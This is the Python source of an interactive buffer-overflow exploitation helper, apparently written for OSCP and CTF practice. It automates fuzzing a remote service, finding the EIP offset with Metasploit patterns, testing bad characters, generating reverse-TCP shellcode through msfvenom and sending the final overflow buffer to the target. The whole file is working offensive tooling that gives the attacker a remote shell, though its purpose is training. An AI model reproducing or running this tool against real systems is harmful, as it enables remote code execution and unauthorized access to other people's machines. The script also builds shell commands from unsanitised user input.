#!/bin/python

##############################################################################
# a Bof helper for oscp etc, not really universal but you know
# will help save time but relies on user understanding what they are doing
# and what the input/output should be
# not sure how useful it will be in the wild but good for ctfs (if even)
# really sloppy code atm, my bad, i just wanted a quick and dirty tool
# relies on msf tools like pattern create/pattern offset and venom
#
# fuzzer code is a modified version from Tib3rius's THM BOF room
# https://tryhackme.com/room/bufferoverflowprep
#
# -iamgroot
##############################################################################

import socket
import sys
import os
import time
import subprocess


##############
# check args #
##############
try:
	ip = sys.argv[1]
	port = int(sys.argv[2])
except:
	print("Usage: %s <rhost> <rport> [<\"prefix string inc. spaces\">]" % sys.argv[0])
	sys.exit(0)


#############
# main menu #
#############
def menu():
	print("")
	print("   __________________________________________________________________")
	print("  |                                                                  |")
	print("  | Prefix string (string) = \"" + prefix  + "\"" + " " * (38-len(prefix)) + "|")
	print("  |     Pattern length (B) = " + str(pat_length) + " " * (40-len(str(pat_length))) + "|")
	print("  |   Bad characters found = " + str(badchars) + " " * (40-len(str(badchars))) + "|")
	print("  |------------------------------------------------------------------|")
	print("  |             Offset (B) = " + str(offset) + " " * (40-len(str(offset))) + "|")
	print("  |          EIP (address) = " + str(eip) + " " * (40-len(str(eip))) + "|")
	print("  |     Padding length (B) = " + str(len(padding)) + " " * (40-len(str(len(padding)))) + "|")
	print("  |    NOP sled length (B) = " + str(len(nop)) + " " * (40-len(str(len(nop)))) + "|")
	print("  |   Shellcode length (B) = " + str(len(shellcode)/4) + " " * (40-len(str(len(shellcode)/4))) + "|")
	print("  |__________________________________________________________________|")
	print("\n    [1]  -  Fuzz (find pattern length, 64 byte increments, max 6400 B)")
	print("    [2]  -  Find offset (create/send msf pattern, then input EIP)")
	print("    [3]  -  Find bad characters")
	print("    [4]  -  Make shellcode (only reverse tcp for now)") # allow custom payload in the future?
	print("    [5]  -  EXPLOIT!!! (will confirm details before exploiting)")
	print("\n    [9]  -  Variable access (raw input, usually unneeded. Be careful)")
	print("    [0]  -  Quit")
	return(input("\nMode: "))


############################################
# connect and send exploit, pass in buffer #
############################################
def exec_exp(buf):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip, port))
#		s.recv(1024)
		time.sleep(2)
		print("Sending evil buffer...")
		s.send(buf)
		s.close()
		print("Done!")
	except:
		print("Could not connect.")


##########
# fuzzer #
##########
def fuzz():
	timeout = 5
	buffer = []
	counter = 64
	temp = 0
	while len(buffer) < 100:
		buffer.append("A" * counter)
		counter += 64
	for string in buffer:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(timeout)
			connect = s.connect((ip, port))
			s.recv(1024)
			print("Fuzzing with %s bytes" % len(string))
			s.send(prefix + string + "\r\n")
			s.recv(1024)
			s.close()
			temp = len(string) + 64
		except:
			print("Could not connect to " + ip + ":" + str(port))
			print("Pattern length = " + str(temp))
			return(temp)
		time.sleep(1)


#############################################
# gets pattern length from fuzzer or user   #
# makes and sends pattern                   #
# gets new EIP from user and returns offset #
#############################################
def make_pattern(length):
	if (length == 0):
		length = str(input("\nPattern length: "))
	pattern = subprocess.check_output("msf-pattern_create -l " + str(length), shell=True)
#	print("Pattern is: " + pattern)
	buffer = str(prefix) + str(pattern)
	print("Sending buffer: " + buffer)
	exec_exp(buffer)
	pat_offset = raw_input("\nNew EIP value: ")
	#temp = os.system("msf-pattern_offset -q " + pat_offset)
	try:
		temp = subprocess.check_output("msf-pattern_offset -q " + pat_offset, shell=True)
		#print(temp)
		#temp2 = temp.split() # does this work?
		temp = temp.split()
		offset = int (temp[-1])
		print("Offset = " + str(offset))
		return(offset)
	except:
		print("Offset not found")


##################
# find bad chars #
##################
def find_bad():
	global badchars
	global badarray
	global offset
	found = ""
	allchars = [
	"\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10",
	"\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20",
	"\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30",
	"\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40",
	"\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50",
	"\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60",
	"\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70",
	"\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80",
	"\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90",
	"\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0",
	"\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0",
	"\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0",
	"\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0",
	"\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0",
	"\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0",
	"\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff"] # as an array 
	temparray = list(sorted(set(allchars) - set(badarray)))
	temp = ''.join(str(e) for e in temparray) # or just (temparray) #### try this if it doesnt work (wrong buffer etc)
#	tempraw = ''.join(r"{temparray}")
	if (offset < 1):
		try:
			offset = int(input("\nNo stored offset found, please provide: "))
		except:
			print("Invalid input")
			return()
	print("Sending buffer: \"A\" * " + str(offset) + " + EIP (" + str(eip) + ") + padding (" + str(len(padding)) + " B) + NOP sled (" + str(len(nop)) + " B) + remaining characters to check...")
	overflow = "A" * offset
	buffer = prefix + overflow + eip + padding + nop + temp
	exec_exp(buffer) # comment out when below commented in
	found = raw_input("\nInput 1 newly found bad char (\\x00 notation, *blank* for none): ")
	while found:
		badchars += found
		if (len(found) != 4 and len(found) != 0):
			print("Invalid input")
			return()
		foundbyte = found.decode('string_escape')
		badarray.append(foundbyte)
		badarray = list(set(badarray))
		badarray = sorted(badarray)
		found = raw_input("\nInput 1 newly found bad char (\\x00 notation, *blank* for none): ")
	print("No new bad characters added")
# convert badarray to avoid divergence failed attempts:
				#	badchars = (''.join(str(e) for e in badarray))
				#	badchars = "%r" % badchars
				#	badchars = badchars.encode('string_escape')
				#	return()
	print("\nBad chars found so far: " + str(badchars))


################################
# make shellcode (reverse tcp) #
################################
def make_shell(badch):
	global badchars
	global mode
	lhost = raw_input("Local ip (default: tun0): ")
	if (len(lhost) < 1):
		print("Setting lhost=tun0")
		lhost = "tun0"
	lport = raw_input("Local port (default: 4444): ")
	if (len(lport) < 3):	
		print("Setting lport=4444")
		lport = "4444"
	temp = raw_input("Bad characters are currently " + badchars + ".\nInput new bad characters to change, leave blank to keep current\n(\\x00 notation): ")
	if (len(temp) > 3):
		badch = temp
		badchars = temp		
	print("Setting bad characters to: " + badch)
	try:
		which_os = input("\n    [1]  -  Linux\n    [2]  -  Windows\n\nOS: ")
		if (which_os==1):
			msf_os = "linux/"
			which_arch = input("\n    [1]  -  x86\n    [2]  -  x64\n\nArch: ")
			if (which_arch == 1):
				msf_arch = "x86/"
			elif (which_arch == 2):
					msf_arch = "x64/"
		elif (which_os==2):
			msf_os = "windows/"
			which_arch = input("\n    [1]  -  x86\n    [2]  -  x64\n\nArch: ")
			if (which_arch == 1):
				msf_arch = ""
			elif (which_arch == 2):
				msf_arch = "x64/"	
	except:
		print("Invalid input")
		return("")
	shellcode = subprocess.check_output("msfvenom -p %s%sshell_reverse_tcp lhost=%s lport=%s -f c exitfunc=thread -b \"%s\" 2>&1|grep \'\"\' |cut -f 2 -d \'\"\' | tr -d \'\\n\'" % (msf_os, msf_arch, lhost, lport, badch ), shell=True)
	print("\nShellcode is: " + str(shellcode))
	print("Shellcode set")
	return(shellcode)


################################
# direct variable manipulation #
################################

def var_manip():
	global prefix
	global pat_length
	global badchars
	global offset
	global eip
	global padding
	global nop
	global shellcode
	print("\nWhich variable would you like to modify?")
	print("    [1]  -  Prefix")
	print("    [2]  -  Pattern length") # kinda pointless to change here...
	print("    [3]  -  Bad characters")
	print("    [4]  -  Offset")
	print("    [5]  -  EIP")
	print("    [6]  -  Padding length")
	print("    [7]  -  NOP sled length")
	print("    [8]  -  Shellcode")
	print("    [0]  -  Main menu")
	try:
		whichvar = input("\nVariable: ")
	except:
		print ("Returning to main menu")
		return()
	if (int(whichvar) == 0):
		print ("Returning to main menu")
		return()
	if (whichvar == 1):
		prefix=raw_input("Prefix: ")
	elif (whichvar == 2):
		try:
			pat_length=int(raw_input("Pattern length: "))
		except:
			print("Invalid input")
			return()
	elif (whichvar == 3):
		badchars=raw_input("Bad characters: ")
	elif (whichvar == 4):
		try:
			offset=int(raw_input("Offset: "))
		except:
			print("Invalid input")
			return()
	elif (whichvar == 5):
		eip=raw_input("EIP: ")
	elif (whichvar == 6):
		try:
			padding="\x90" * int(raw_input("Padding length: "))
		except:
			print("Invalid input")
			return()
	elif (whichvar == 7):
		try:
			nop="\x90" * int(raw_input("NOP sled length: "))
		except:
			print("Invalid input")
			return()
	elif (whichvar == 8):
		shellcode=raw_input("Shellcode: ")
	else:
		print("Invalid input")
		return()


#############################
# exploit creation function #
#############################
def exploit():
		global padding
		global nop
		global eip
		global offset
		if (len(shellcode) == 0 ):
			print("\nNo shellcode found, create first")
			return()
		if (int(offset) == 0):
			try:
				offset=int(raw_input("Offset: "))
			except:
				print("Invalid input")
				return()
		if (len(eip) != 16):
			eip = raw_input("EIP (little-endian \\x00 notation): ")
			if (not eip or len(eip) != 16 ):
				print("Invalid input")
				return()
		paddingsize = raw_input("Padding in bytes (distance from EIP to ESP; default 4 B): ")
		if not paddingsize :
			paddingsize = 4
		try:
			paddingsize = int(paddingsize)
		except:
			print("Invalid input")
			return()
		nopsize = raw_input("NOP sled in bytes (default 16 B): ")
		if not nopsize:
			nopsize = 16
		try:
			nopsize = int(nopsize)
		except:
			print("Invalid input")
			return()
		overflow = "A" * offset   # ignore - setup the pre eip padding
		padding = "\x90" * paddingsize
		nop = "\x90" * nopsize
		print("Length of offset = " + str(len(overflow)))
		print("EIP = " + eip )
		print("Length of padding = " + str(len(padding)))
		print("Length of NOP sled = " + str(len(nop)))
		print("Shellcode = " + shellcode)
		ready = raw_input("Continue (y/n)? ")
		if (ready == "y" or ready == "Y"):
			buffer = prefix + overflow + eip.decode('string_escape') + padding + nop + shellcode.decode('string_escape') # + postfix?
			exec_exp(buffer)
		else:
			print("You seem unsure...")
			return()


#################
# main function #
#################
# moved overflow to exploit functions, good idea or bad?
eip = "BBBB"                # jmp esp? add opotions for other cmds or shellcode insertion points
padding = "\x90" * 4        # bytes between eip and esp
nop = "\x90" * 16           # nop sled, may not be needed but nice to have if there's room
offset = 0                  # bytes before eip
badchars = r"\x00"          # bad chars
badarray = ["\x00"]           # same but in a set (redundant?)
shellcode = ""              # duh
mode = ""                   # for menu
pat_length = 0              # from fuzzer or manual input to making a pattern

# parse prefix if necessary
try:
	prefix = str(sys.argv[3])       # any precursor string for nc to trigger the bof, use quotes if there is a space
except:
	prefix = ""

# call main menu
while (mode != 0):
	if (mode == 1):
		pat_length = fuzz()
	elif (mode == 2):
		offset = make_pattern(pat_length)       # how many bytes to get to eip
	elif (mode == 3):
		find_bad()
#		badchars = string of badarray #in func
#		print("not implemented")
	elif (mode == 4):
		shellcode = make_shell(badchars)
	elif (mode == 9):
		var_manip()
	elif (mode == 5):
		exploit()
	elif (mode == 0):
		sys.exit(0)
	try:
		mode = menu()
	except:
		print("Invalid Entry")

######### D O N E ###################### F I N ###############
